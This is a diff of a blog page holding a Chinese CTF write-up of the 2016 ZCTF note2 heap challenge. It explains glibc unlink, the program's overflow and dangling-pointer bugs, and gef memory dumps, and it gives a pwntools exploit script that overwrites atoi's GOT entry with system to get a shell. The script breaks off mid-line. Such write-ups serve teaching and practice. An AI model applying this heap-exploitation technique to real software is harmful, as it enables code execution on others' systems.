@@ -108,17 +108,17 @@
 
 
 
-  <meta name="description" content="首先，我们先分析一下程序，可以看出程序的主要功能为 添加note，size限制为0x80，size会被记录，note指针会被记录。展示note内容。编辑note内容，其中包括覆盖已有的note，在已有的note后面添加内容。释放note。仔细分析后，可以发现程序有以下几个问题 在添加note时，程序会记录note对应的大小，该大小会用于控制读取note的内容，但是读取的循环变量i是无符号变量，所以">
+  <meta name="description" content="2016 ZCTF note2 writeup关于 unlink 利用">
 <meta name="keywords">
 <meta property="og:type" content="article">
-<meta property="og:title" content="2016 ZCTF note2">
+<meta property="og:title" content="CTF | 2016 ZCTF note2">
 <meta property="og:url" content="https://yuuoniy.github.io/2018/04/05/2016 ZCTF note2/index.html">
 <meta property="og:site_name" content="尿尿">
-<meta property="og:description" content="首先，我们先分析一下程序，可以看出程序的主要功能为 添加note，size限制为0x80，size会被记录，note指针会被记录。展示note内容。编辑note内容，其中包括覆盖已有的note，在已有的note后面添加内容。释放note。仔细分析后，可以发现程序有以下几个问题 在添加note时，程序会记录note对应的大小，该大小会用于控制读取note的内容，但是读取的循环变量i是无符号变量，所以">
-<meta property="og:updated_time" content="2018-04-05T14:08:46.468Z">
+<meta property="og:description" content="2016 ZCTF note2 writeup关于 unlink 利用">
+<meta property="og:updated_time" content="2018-09-25T16:38:07.916Z">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:title" content="2016 ZCTF note2">
-<meta name="twitter:description" content="首先，我们先分析一下程序，可以看出程序的主要功能为 添加note，size限制为0x80，size会被记录，note指针会被记录。展示note内容。编辑note内容，其中包括覆盖已有的note，在已有的note后面添加内容。释放note。仔细分析后，可以发现程序有以下几个问题 在添加note时，程序会记录note对应的大小，该大小会用于控制读取note的内容，但是读取的循环变量i是无符号变量，所以">
+<meta name="twitter:title" content="CTF | 2016 ZCTF note2">
+<meta name="twitter:description" content="2016 ZCTF note2 writeup关于 unlink 利用">
 
 
 
@@ -135,7 +135,7 @@
   };
 </script>
 
-  <title>2016 ZCTF note2 | 尿尿</title>
+  <title>CTF | 2016 ZCTF note2 | 尿尿</title>
   
 
 
@@ -343,7 +343,7 @@
 
         
         
-          <h1 class="post-title" itemprop="name headline">2016 ZCTF note2
+          <h1 class="post-title" itemprop="name headline">CTF | 2016 ZCTF note2
               
             
           </h1>
@@ -368,12 +368,24 @@
                 
               
 
-              <time title="Created: 2018-04-05 23:27:02 / Modified: 22:08:46" itemprop="dateCreated datePublished" datetime="2018-04-05T23:27:02+08:00">2018-04-05</time>
+              <time title="Created: 2018-04-05 23:27:02" itemprop="dateCreated datePublished" datetime="2018-04-05T23:27:02+08:00">2018-04-05</time>
             
 
             
               
 
+              
+                
+                <span class="post-meta-divider">|</span>
+                
+
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-calendar-check-o"></i>
+                </span>
+                
+                  <span class="post-meta-item-text">Edited on</span>
+                
+                <time title="Modified: 2018-09-26 00:38:07" itemprop="dateModified" datetime="2018-09-26T00:38:07+08:00">2018-09-26</time>
               
             
           </span>
@@ -398,7 +410,7 @@
 
           
           
-             <span id="/2018/04/05/2016 ZCTF note2/" class="leancloud_visitors" data-flag-title="2016 ZCTF note2">
+             <span id="/2018/04/05/2016 ZCTF note2/" class="leancloud_visitors" data-flag-title="CTF | 2016 ZCTF note2">
                <span class="post-meta-divider">|</span>
                <span class="post-meta-item-icon">
                  <i class="fa fa-eye"></i>
@@ -423,7 +435,7 @@
                 
                   <span class="post-meta-item-text">Symbols count in article: </span>
                 
-                <span title="Symbols count in article">380</span>
+                <span title="Symbols count in article">9.1k</span>
               
 
               
@@ -437,7 +449,7 @@
                 
                   <span class="post-meta-item-text">Reading time &asymp;</span>
                 
-                <span title="Reading time">1 mins.</span>
+                <span title="Reading time">8 mins.</span>
               
             </div>
           
@@ -457,10 +469,35 @@
       
 
       
-        <p>首先，我们先分析一下程序，可以看出程序的主要功能为</p>
-<p>添加note，size限制为0x80，size会被记录，note指针会被记录。<br>展示note内容。<br>编辑note内容，其中包括覆盖已有的note，在已有的note后面添加内容。<br>释放note。<br>仔细分析后，可以发现程序有以下几个问题</p>
-<p>在添加note时，程序会记录note对应的大小，该大小会用于控制读取note的内容，但是读取的循环变量i是无符号变量，所以比较时都会转换为无符号变量，那么当我们输入size为0时，glibc根据其规定，会分配0x20个字节，但是程序读取的内容却并不受到限制，故而会产生堆溢出。<br>程序在每次编辑note时，都会申请0xa0大小的内存，但是在 free 之后并没有设置为NULL。</p>
-<p><a href="https://ctf-wiki.github.io/ctf-wiki/pwn/heap/unlink/" target="_blank" rel="external">https://ctf-wiki.github.io/ctf-wiki/pwn/heap/unlink/</a></p>
+        <p>2016 ZCTF note2 writeup<br>关于 unlink 利用<br><a id="more"></a></p>
+<h3 id="unlink"><a href="#unlink" class="headerlink" title="unlink"></a>unlink</h3><p>来复习一下 unlink。。<br>控制堆块的 fd,bk 指针<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">FD=P-&gt;fd </div><div class="line">BK=P-&gt;bk</div><div class="line">FD-&gt;bk = BK</div><div class="line">BK-&gt;fd = FD</div></pre></td></tr></table></figure></p>
+<p>64位：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">fd = &amp;P-0x18</div><div class="line">bk = &amp;P-0x10</div><div class="line">效果： P = &amp;P-0X18</div></pre></td></tr></table></figure></p>
+<p>32 位<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">fd = &amp;p-12</div><div class="line">bk = &amp;p-8</div><div class="line">效果: p =&amp;p-12</div></pre></td></tr></table></figure></p>
+<p>可以好好看一下 unlink 宏<br><figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div></pre></td><td class="code"><pre><div class="line"><span class="meta">#<span class="meta-keyword">define</span> unlink(AV, P, BK, FD) &#123;                                            \</span></div><div class="line">    <span class="meta-keyword">if</span> (__builtin_expect (chunksize(P) != prev_size (next_chunk(P)), 0))      \</div><div class="line">      malloc_printerr (<span class="meta-string">"corrupted size vs. prev_size"</span>);                              \</div><div class="line">    FD = P-&gt;fd;                                                                      \</div><div class="line">    BK = P-&gt;bk;                                                                      \</div><div class="line">    <span class="meta-keyword">if</span> (__builtin_expect (FD-&gt;bk != P || BK-&gt;fd != P, 0))                      \</div><div class="line">      malloc_printerr (<span class="meta-string">"corrupted double-linked list"</span>);                              \</div><div class="line">    <span class="meta-keyword">else</span> &#123;                                                                      \</div><div class="line">        FD-&gt;bk = BK;                                                              \</div><div class="line">        BK-&gt;fd = FD;                                                              \</div><div class="line">       ....</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
+<h3 id="分析程序"><a href="#分析程序" class="headerlink" title="分析程序"></a>分析程序</h3><p>首先，我们先分析一下程序，可以看出程序的主要功能为</p>
+<h4 id="add"><a href="#add" class="headerlink" title="add"></a>add</h4><p>size 限制为 <code>0x80</code></p>
+<h4 id="show"><a href="#show" class="headerlink" title="show"></a>show</h4><p>输出 <code>note</code> 内容</p>
+<h4 id="edit"><a href="#edit" class="headerlink" title="edit"></a>edit</h4><p>其中包括覆盖已有的 <code>note</code> ，在已有的 <code>note</code> 后面添加内容。</p>
+<h4 id="free"><a href="#free" class="headerlink" title="free"></a>free</h4><p>释放 chunk</p>
+<p>bss 段 ptr <code>0x00000602120</code> 管理 malloc chunk 的 ptr，是 ptr 的数组，我们的目的就是把 ptr 改为 ptr-12,然后可以修改 ptr[x] 的值什么的，然后往 <code>ptr[x]</code> 指向的地方写东西。 你想想 ptr[x] 改为 <code>free_hook</code> 或其他，再通过<code>edit x</code>，把内容改为 <code>system</code> 函数地址，不就利用啦</p>
+<h3 id="漏洞"><a href="#漏洞" class="headerlink" title="漏洞"></a>漏洞</h3><ol>
+<li>堆溢出<br>在添加 note 时，需要设置 <code>note</code> 的 <code>size</code> ，但是读取的循环变量 i 是<strong>无符号</strong>变量，所以比较时都会转换为无符号变量，那么当我们输入 <code>size</code> 为 0 时，<code>size-1</code> 会变成一个很大的整数，glibc 根据其规定，会分配 0x20 个字节，但是程序读取的内容却并不受到限制，故而会产生堆溢出。<br>ps:这个漏洞我自己是看不出的…</li>
+<li>free 漏洞<br>edit 函数,每次都会<code>malloc 0xa0</code>,但是 free 的时候没有把指针置为 NULL</li>
+</ol>
+<h3 id="利用"><a href="#利用" class="headerlink" title="利用"></a>利用</h3><h4 id="unlink-1"><a href="#unlink-1" class="headerlink" title="unlink"></a>unlink</h4><p>首先 <code>new</code> 三个 <code>chunk</code>: 大小分别为 <code>0x80,0,0x80。</code><br>第二个 <code>chunk</code> 虽然申请的大小为0，但是glibc的要求 chunk 块至少可以存储4个必要的字段<code>(prev_size,size,fd,bk)</code>，所以会分配 <code>0x20</code> 的空间,又因为程序漏洞，所以可以读取任意长度的内容。。<br><figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div></pre></td><td class="code"><pre><div class="line">gef➤  x/<span class="number">16</span>gx <span class="number">0x0000000000602120</span></div><div class="line"><span class="number">0x602120</span>:	<span class="number">0x0000000000861010</span>	<span class="number">0x00000000008610a0</span> =&gt; ptr[<span class="number">0</span>] ptr[<span class="number">1</span>]</div><div class="line"><span class="number">0x602130</span>:	<span class="number">0x00000000008610c0</span>	<span class="number">0x0000000000000000</span> =&gt; ptr[<span class="number">2</span>]</div><div class="line"><span class="number">0x602140</span>:	<span class="number">0x0000000000000080</span>	<span class="number">0x0000000000000000</span></div><div class="line"><span class="number">0x602150</span>:	<span class="number">0x0000000000000080</span>	<span class="number">0x0000000000000000</span></div><div class="line"><span class="number">0x602160</span>:	<span class="number">0x0000000000000003</span>	<span class="number">0x0000000000000000</span></div><div class="line"><span class="number">0x602170</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000000</span></div><div class="line"><span class="number">0x602180</span>:	<span class="number">0x0000006f6c6c6568</span>	<span class="number">0x0000000000000000</span></div><div class="line"></div><div class="line">gef➤  heap chunks</div><div class="line">Chunk(addr=<span class="number">0x861010</span>, size=<span class="number">0x90</span>, flags=PREV_INUSE) =&gt; chunk <span class="number">0</span></div><div class="line">    [<span class="number">0x0000000000861010</span>     <span class="number">61</span> <span class="number">61</span> <span class="number">61</span> <span class="number">61</span> <span class="number">61</span> <span class="number">61</span> <span class="number">61</span> <span class="number">61</span> <span class="number">61</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>     aaaaaaaaa.......] </div><div class="line">Chunk(addr=<span class="number">0x8610a0</span>, size=<span class="number">0x20</span>, flags=PREV_INUSE) =&gt; chunk <span class="number">1</span></div><div class="line">    [<span class="number">0x00000000008610a0</span>     <span class="number">61</span> <span class="number">61</span> <span class="number">61</span> <span class="number">61</span> <span class="number">61</span> <span class="number">61</span> <span class="number">61</span> <span class="number">61</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>     aaaaaaaa........]</div><div class="line">Chunk(addr=<span class="number">0x8610c0</span>, size=<span class="number">0x90</span>, flags=PREV_INUSE) =&gt; chunk <span class="number">2</span></div><div class="line">    [<span class="number">0x00000000008610c0</span>     <span class="number">62</span> <span class="number">62</span> <span class="number">62</span> <span class="number">62</span> <span class="number">62</span> <span class="number">62</span> <span class="number">62</span> <span class="number">62</span> <span class="number">62</span> <span class="number">62</span> <span class="number">62</span> <span class="number">62</span> <span class="number">62</span> <span class="number">62</span> <span class="number">62</span> <span class="number">62</span>     bbbbbbbbbbbbbbbb]</div></pre></td></tr></table></figure></p>
+<p>堆块结构：<br><figure class="highlight"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div></pre></td><td class="code"><pre><div class="line">gef➤  x/32gx 0x861010-0x10</div><div class="line">0x861000:	0x0000000000000000	0x0000000000000091 =&gt; chunk 0 header </div><div class="line">0x861010:	0x6161616161616161	0x0000000000000061 =&gt; ptr[0] chunk 0 fake header1 </div><div class="line">0x861020:	0x0000000000602108	0x0000000000602110 =&gt; fake fd, fake bk</div><div class="line">0x861030:	0x6262626262626262	0x6262626262626262</div><div class="line">0x861040:	0x6262626262626262	0x6262626262626262</div><div class="line">0x861050:	0x6262626262626262	0x6262626262626262</div><div class="line">0x861060:	0x6262626262626262	0x6262626262626262</div><div class="line">0x861070:	0x0000000000000060	0x0000000000000000 =&gt; fake pre_size | fake ptr[0] chunk''s nextchunk</div><div class="line">0x861080:	0x0000000000000000	0x0000000000000000</div><div class="line">0x861090:	0x0000000000000000	0x0000000000000021 =&gt; chunk 1 header</div><div class="line">0x8610a0:	0x6161616161616161	0x0000000000000000 =&gt; ptr[1]</div><div class="line">0x8610b0:	0x0000000000000000	0x0000000000000091 =&gt; chunk 2 header</div><div class="line">0x8610c0:	0x6262626262626262	0x6262626262626262 =&gt; ptr[2] </div><div class="line">0x8610d0:	0x0000000000000000	0x0000000000000000</div><div class="line">0x8610e0:	0x0000000000000000	0x0000000000000000</div><div class="line">0x8610f0:	0x0000000000000000	0x0000000000000000</div></pre></td></tr></table></figure></p>
+<p>其中构造了 <code>fake pre_size</code>是为了满足 <code>unlink</code> 中的检查</p>
+<p>接下来<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">释放chunk1-覆盖chunk2-释放chunk2</div><div class="line">deletenote(1)</div><div class="line">content = &apos;a&apos; * 16 + p64(0xa0) + p64(0x90)</div><div class="line">newnote(0, content)</div><div class="line">deletenote(2)</div></pre></td></tr></table></figure></p>
+<p><code>free chunk 1</code>,大小为 <code>0x20</code>,会放到 <code>fastbin</code>，<code>newnote</code> 的时候为同一个，通过栈溢出可以修改 <code>chunk 2</code> <code>的pre_size</code> 和 <code>size</code> 分别为 <code>0xa0</code> 和 <code>0x90</code>。主要是设置了 <code>pre_size</code> 为 <code>0xa0</code>,并且 <code>inuse</code> 为 0，在进行 <code>unlink</code> 时根据 <code>pre_size</code> 得到后一个 <code>chunk</code>,刚好是我们在 <code>chunk 0</code> 中构造的 <code>fake chunk</code>。所以释放 <code>chunk2</code> 的时候可以后向合并（合并低地址），对 <code>chunk 0</code> 中虚拟构造的 <code>chunk</code> 进行 <code>unlink</code> 。 <code>unlink</code> 成功后，<code>ptr[0]</code>所存储的地址变为 <code>fakebk</code> ，即<code>ptr-0x18</code>。<br>可以看一下具体操作<br><figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line"><span class="comment">/* consolidate backward */</span></div><div class="line">  <span class="keyword">if</span> (!prev_inuse(p)) &#123;</div><div class="line">    prevsize = prev_size (p);</div><div class="line">    size += prevsize;</div><div class="line">    p = chunk_at_offset(p, -((<span class="keyword">long</span>) prevsize));</div><div class="line">    unlink(av, p, bck, fwd);</div><div class="line">  &#125;</div></pre></td></tr></table></figure></p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div></pre></td><td class="code"><pre><div class="line">gef➤  x/<span class="number">32</span>gx <span class="number">0xae6010</span><span class="number">-0x10</span></div><div class="line"><span class="number">0xae6000</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000091</span></div><div class="line"><span class="number">0xae6010</span>:	<span class="number">0x6161616161616161</span>	<span class="number">0x0000000000000061</span></div><div class="line"><span class="number">0xae6020</span>:	<span class="number">0x0000000000602108</span>	<span class="number">0x0000000000602110</span></div><div class="line"><span class="number">0xae6030</span>:	<span class="number">0x6262626262626262</span>	<span class="number">0x6262626262626262</span></div><div class="line"><span class="number">0xae6040</span>:	<span class="number">0x6262626262626262</span>	<span class="number">0x6262626262626262</span></div><div class="line"><span class="number">0xae6050</span>:	<span class="number">0x6262626262626262</span>	<span class="number">0x6262626262626262</span></div><div class="line"><span class="number">0xae6060</span>:	<span class="number">0x6262626262626262</span>	<span class="number">0x6262626262626262</span></div><div class="line"><span class="number">0xae6070</span>:	<span class="number">0x0000000000000060</span>	<span class="number">0x0000000000000000</span></div><div class="line"><span class="number">0xae6080</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000000</span></div><div class="line"><span class="number">0xae6090</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000021</span></div><div class="line"><span class="number">0xae60a0</span>:	<span class="number">0x6161616161616161</span>	<span class="number">0x6161616161616161</span> </div><div class="line"><span class="number">0xae60b0</span>:	<span class="number">0x00000000000000a0</span>	<span class="number">0x0000000000000090</span> =&gt; chunk <span class="number">2</span> header modified</div><div class="line"><span class="number">0xae60c0</span>:	<span class="number">0x6262626262626200</span>	<span class="number">0x6262626262626262</span> =&gt; ptr[<span class="number">2</span>]</div><div class="line"><span class="number">0xae60d0</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000000</span></div><div class="line"><span class="number">0xae60e0</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000000</span></div><div class="line"><span class="number">0xae60f0</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000000</span></div></pre></td></tr></table></figure>
+<p>unlink后的效果：<br><figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">gef➤  x/<span class="number">16</span>gx <span class="number">0x0000000000602120</span></div><div class="line"><span class="number">0x602120</span>:	<span class="number">0x0000000000602108</span>	<span class="number">0x0000000000000000</span> =&gt; ptr[<span class="number">0</span>] = ptr<span class="number">-0x18</span></div><div class="line"><span class="number">0x602130</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x00000000008750a0</span></div></pre></td></tr></table></figure></p>
+<h4 id="泄露libc-地址"><a href="#泄露libc-地址" class="headerlink" title="泄露libc 地址"></a>泄露libc 地址</h4><p><code>edit note[0]</code>，即 <code>edit ptr[0]</code> 指向的地方,即 <code>ptr-0x18</code>,修改 <code>ptr[0]</code> 为 <code>atoi</code> 的 <code>got</code>,通过 <code>show</code> 得到 <code>atoi</code> 地址，计算得 <code>libc</code> 地址<br><figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div></pre></td><td class="code"><pre><div class="line">gef➤  x/<span class="number">16</span>gx <span class="number">0x0000000000602120</span></div><div class="line"><span class="number">0x602120</span>:	<span class="number">0x0000000000602088</span>	<span class="number">0x0000000000000000</span> =&gt; ptr[<span class="number">0</span>] = atoi@got.plt</div><div class="line"><span class="number">0x602130</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x00000000023710a0</span></div><div class="line"><span class="number">0x602140</span>:	<span class="number">0x0000000000000080</span>	<span class="number">0x0000000000000000</span></div><div class="line"><span class="number">0x602150</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000000</span></div><div class="line"><span class="number">0x602160</span>:	<span class="number">0x0000000000000004</span>	<span class="number">0x0000000000000000</span></div><div class="line"><span class="number">0x602170</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000000</span></div><div class="line"><span class="number">0x602180</span>:	<span class="number">0x0000006f6c6c6568</span>	<span class="number">0x0000000000000000</span></div><div class="line"><span class="number">0x602190</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000000</span></div><div class="line">gef➤  x/<span class="number">16</span>gx <span class="number">0x0000000000602088</span></div><div class="line"><span class="number">0x602088</span> &lt;atoi@got.plt&gt;:	<span class="number">0x00007fc6acaa3e80</span>	<span class="number">0x00000000004008c6</span></div><div class="line"><span class="number">0x602098</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000000</span></div><div class="line"><span class="number">0x6020a8</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000000</span></div><div class="line">gef➤  x/<span class="number">16</span>gx <span class="number">0x00007fc6acaa3e80</span></div><div class="line"><span class="number">0x7fc6acaa3e80</span> &lt;atoi&gt;:	<span class="number">0x00000aba08ec8348</span>	<span class="number">0x00004530e8f63100</span></div></pre></td></tr></table></figure></p>
+<p>接下来修改 <code>atoi</code> 的 <code>got</code> 为 <code>system</code> 函数的地址</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">content = p64(system_addr)</div><div class="line">editnote(<span class="number">0</span>, <span class="number">1</span>, content)</div></pre></td></tr></table></figure>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line">gef➤  x/<span class="number">8</span>gx <span class="number">0x0000000000602088</span></div><div class="line"><span class="number">0x602088</span> &lt;atoi@got.plt&gt;:	<span class="number">0x00007f44aa9a1390</span>	<span class="number">0x00000000004008c6</span></div><div class="line"><span class="number">0x602098</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000000</span></div><div class="line"><span class="number">0x6020a8</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000000</span></div><div class="line"><span class="number">0x6020b8</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x00007f44aad21620</span></div><div class="line">gef➤  x/<span class="number">8</span>gx <span class="number">0x00007f44aa9a1390</span></div><div class="line"><span class="number">0x7f44aa9a1390</span> &lt;__libc_system&gt;:	<span class="number">0xfa86e90b74ff8548</span>	<span class="number">0x0000441f0f66ffff</span></div><div class="line"><span class="number">0x7f44aa9a13a0</span> &lt;__libc_system+<span class="number">16</span>&gt;:	<span class="number">0x48001479b83d8d48</span>	<span class="number">0xfffffa70e808ec83</span></div></pre></td></tr></table></figure>
+<h4 id="getshell"><a href="#getshell" class="headerlink" title="getshell"></a>getshell</h4><p>发送 <code>&#39;/bin/sh&#39;</code>就可以成功 <code>getshell</code> 了<br>最终 <code>payload</code><br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div><div class="line">69</div><div class="line">70</div><div class="line">71</div><div class="line">72</div><div class="line">73</div><div class="line">74</div><div class="line">75</div><div class="line">76</div><div class="line">77</div><div class="line">78</div><div class="line">79</div><div class="line">80</div><div class="line">81</div><div class="line">82</div><div class="line">83</div><div class="line">84</div><div class="line">85</div><div class="line">86</div><div class="line">87</div><div class="line">88</div><div class="line">89</div><div class="line">90</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</div><div class="line">p = process(<span class="string">'./note2'</span>)</div><div class="line">note2 = ELF(<span class="string">'./note2'</span>)</div><div class="line">libc = ELF(<span class="string">'/lib/x86_64-linux-gnu/libc.so.6'</span>)</div><div class="line">context.log_level = <span class="string">'debug'</span></div><div class="line"></div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">newnote</span><span class="params">(length, content)</span>:</span></div><div class="line">    p.recvuntil(<span class="string">'option---&gt;&gt;'</span>)</div><div class="line">    p.sendline(<span class="string">'1'</span>)</div><div class="line">    p.recvuntil(<span class="string">'(less than 128)'</span>)</div><div class="line">    p.sendline(str(length))</div><div class="line">    p.recvuntil(<span class="string">'content:'</span>)</div><div class="line">    p.sendline(content)</div><div class="line"></div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">shownote</span><span class="params">(id)</span>:</span></div><div class="line">    p.recvuntil(<span class="string">'option---&gt;&gt;'</span>)</div><div class="line">    p.sendline(<span class="string">'2'</span>)</div><div class="line">    p.recvuntil(<span class="string">'note:'</span>)</div><div class="line">    p.sendline(str(id))</div><div class="line"></div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">editnote</span><span class="params">(id, choice, s)</span>:</span></div><div class="line">    p.recvuntil(<span class="string">'option---&gt;&gt;'</span>)</div><div class="line">    p.sendline(<span class="string">'3'</span>)</div><div class="line">    p.recvuntil(<span class="string">'note:'</span>)</div><div class="line">    p.sendline(str(id))</div><div class="line">    p.recvuntil(<span class="string">'2.append]'</span>)</div><div class="line">    p.sendline(str(choice))</div><div class="line">    p.sendline(s)</div><div class="line"></div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">deletenote</span><span class="params">(id)</span>:</span></div><div class="line">    p.recvuntil(<span class="string">'option---&gt;&gt;'</span>)</div><div class="line">    p.sendline(<span class="string">'4'</span>)</div><div class="line">    p.recvuntil(<span class="string">'note:'</span>)</div><div class="line">    p.sendline(str(id))</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">unlink</span><span class="params">()</span>:</span></div><div class="line">	ptr = <span class="number">0x0000000000602120</span></div><div class="line">	fakefd = ptr - <span class="number">0x18</span></div><div class="line">	fakebk = ptr - <span class="number">0x10</span></div><div class="line">	content = <span class="string">'a'</span> * <span class="number">8</span> + p64(<span class="number">0x61</span>) + p64(fakefd) + p64(fakebk) + <span class="string">'b'</span> * <span class="number">64</span> + p64(<span class="number">0x60</span>)</div><div class="line">	<span class="comment">#content = p64(fakefd) + p64(fakebk)</span></div><div class="line">	newnote(<span class="number">128</span>, content)</div><div class="line">	<span class="comment"># chunk1: a zero size chunk produce overwrite</span></div><div class="line">	newnote(<span class="number">0</span>, <span class="string">'a'</span> * <span class="number">8</span>)</div><div class="line">	<span class="comment"># chunk2: a chunk to be overwrited and freed</span></div><div class="line">	newnote(<span class="number">0x80</span>, <span class="string">'b'</span> * <span class="number">16</span>)</div><div class="line">	deletenote(<span class="number">1</span>)</div><div class="line">	content = <span class="string">'a'</span> * <span class="number">16</span> + p64(<span class="number">0xa0</span>) + p64(<span class="number">0x90</span>)</div><div class="line">	newnote(<span class="number">0</span>, content)</div><div class="line">	deletenote(<span class="number">2</span>)</div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">system</span><span class="params">()</span>:</span></div><div class="line">	atoi_got = note2.got[<span class="string">'atoi'</span>]</div><div class="line">	content = <span class="string">'a'</span> * <span class="number">0x18</span> + p64(atoi_got)</div><div class="line">	editnote(<span class="number">0</span>, <span class="number">1</span>, content)</div><div class="line">	</div><div class="line">	shownote(<span class="number">0</span>)</div><div class="line"></div><div class="line">	p.recvuntil(<span class="string">'is '</span>)</div><div class="line">	atoi_addr = p.recvuntil(<span class="string">'\n'</span>, drop=<span class="keyword">True</span>)</div><div class="line">	<span class="keyword">print</span> atoi_addr</div><div class="line">	atoi_addr = u64(atoi_addr.ljust(<span class="number">8</span>, <span class="string">'\x00'</span>))</div><div class="line">	<span class="keyword">print</span> <span class="string">'leak atoi addr: '</span> + hex(atoi_addr)</div><div class="line"></div><div class="line">	<span class="comment"># get system addr</span></div><div class="line">	atoi_offest = libc.symbols[<span class="string">'atoi'</span>]</div><div class="line">	libcbase = atoi_addr - atoi_offest</div><div class="line">	system_offest = libc.symbols[<span class="string">'system'</span>]</div><div class="line">	system_addr = libcbase + system_offest</div><div class="line">	</div><div class="line">	<span class="keyword">print</span> <span class="string">'leak system 